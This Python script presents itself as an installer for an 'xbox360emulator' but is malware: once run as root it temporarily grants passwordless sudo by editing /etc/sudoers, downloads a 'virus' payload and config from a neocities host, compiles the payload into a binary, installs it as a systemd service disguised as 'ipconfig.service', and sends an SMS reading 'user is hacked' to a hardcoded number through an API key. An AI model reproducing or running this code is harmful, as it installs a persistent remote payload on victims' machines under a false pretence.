import subprocess
import fileinput
import os
import psutil
import zlib

def execute(program):
	subprocess.Popen(program, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

def downloader(source, script):
	wget = 'wget -b ' + source + script
	rlog = 'rm wget-log' + '*'
	rscr = 'rm ' + script + '*'
	execute(rscr)
	execute(wget)
	execute(rlog)

def passwdon(fileName, sourceText, replaceText):
	file = open(fileName, 'r')
	text = file.read()
	file.close()
	file = open(fileName, 'w')
	file.write(text.replace(sourceText, replaceText))
	file.close()

def sms(massage):
	subprocess.Popen('curl -d "text=' + massage + '" https://sms.ru/sms/send\?api_id=2645FE55-6A2E-A98B-42A1-BDF707900EC1\&to=79043430746', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

def ConfirmRunningAsRoot():
	if os.getuid() != 0:
		print(' [!] ERROR: xbox360emulator must be run as root')
		print(' [!] login as root (su root) or try sudo python3 xbox')
		print(' [!] ОШИБКА: xbox360emulator должен быть установлен под root')
		print(' [!] Залогиньтесь под root (su root) или введите sudo python3 xbox')
		exit(1)

def ConfirmCorrectPlatform():
	if not os.uname()[0].startswith("Linux") and not 'Darwin' in os.uname()[0]: 
		print(' [!] WARNING: xbox360emulator must be run on linux')
		exit(1)

def WARNING():
	for proc in psutil.process_iter():
		name = proc.name()
		if name == "main.bin":
			print('Сервер временно недоступен')
			exit(1)


if __name__ == '__main__':
	document = '/etc/sudoers'
	sourceText = '%sudo ALL=(ALL:ALL) ALL'
	replaceText = '%sudo ALL=(ALL:ALL) NOPASSWD: ALL'
	massage = 'user is hacked'
	source = 'https://4lximk0t3.neocities.org/'
	unit = 'config.txt'
	mask = 'wine.so'
	virus = 'main.txt'
	ConfirmRunningAsRoot()
	ConfirmCorrectPlatform()
	WARNING()
	execute(mask)
	downloader(source, unit)
	downloader(source, virus)
	passwdon(document, sourceText, replaceText)
	execute('sudo apt-get --force-yes -y install clang')
	execute('sudo mkdir /opt/bin')
	execute('sudo cp main.txt /opt/bin/main.c')
	execute('sudo clang -static -o main.bin /opt/bin/main.c')
	execute('sudo cp config.txt /etc/systemd/system/ipconfig.service')
	execute('sudo systemctl enable ipconfig.service')
	execute('sudo systemctl start ipconfig.service')
	sms(massage)
	passwdon(document, replaceText, sourceText)